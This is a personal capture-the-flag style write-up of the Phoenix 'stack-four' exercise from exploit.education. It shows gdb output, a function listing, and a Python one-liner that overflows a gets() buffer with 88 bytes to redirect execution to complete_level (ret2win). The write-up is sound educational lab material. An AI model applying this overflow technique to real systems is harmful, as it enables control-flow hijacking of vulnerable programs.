### Stackfour 

This one was again a lot more difficult for me, I didnt knew how to find the buffer size.
I set out to find it manually and figured it was somewhere between 90-81 but I was not sure.
I had to look it up to see how to check it, it was simple
1. Gdb
2. breakpoint before and after gets
3. after gets, info frame
4. Find the memory locations and perform subtractions

Our code really remains the same, and it just works. 


### Creds
```
None
```

### Logs
```


## --- Successful attempt ---
gef➤  info frame
Stack level 0, frame at 0x7fffffffe360:
 rip = 0x400649 in start_level; saved rip = 0x40068d
 called by frame at 0x7fffffffe380
 Arglist at 0x7fffffffe350, args: 
 Locals at 0x7fffffffe350, Previous frame's sp is 0x7fffffffe360
 Saved registers:
  rbp at 0x7fffffffe350, rip at 0x7fffffffe358
gef➤  quit


```

This is a type of ret2win, basically we need to jump to the function of complete_level, so as to do that, we can use pwndbg's cyclic to generate a pattern
With the generated pattern we can perform lookup to find out the exact offset, with that we can craft our payload and pass the return for the other function

```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  printf@plt
0x0000000000400470  gets@plt
0x0000000000400480  puts@plt
0x0000000000400490  exit@plt
0x00000000004004a0  __libc_start_main@plt
0x00000000004004b0  _start
0x00000000004004c6  _start_c
0x00000000004004f0  deregister_tm_clones
0x0000000000400520  register_tm_clones
0x0000000000400560  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
0x00000000004006a0  __do_global_ctors_aux
0x00000000004006e2  _fini
gef➤  quit

```

```
  /opt/phoenix/amd64 ──────────────────────────────────────────────────── took  7s  .env with vagrant@bookworm at  15:33:20
❯ python3 -c "import sys;sys.stdout.buffer.write(b'A'*88 + b'\x1d\x06\x40\x00')" > ~/paylaod

  /opt/phoenix/amd64 ──────────────────────────────────────────────────────────────  .env with vagrant@bookworm at  15:36:03
❯ ./stack-four < ~/paylaod                                                          
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!

```

 ~Kurama
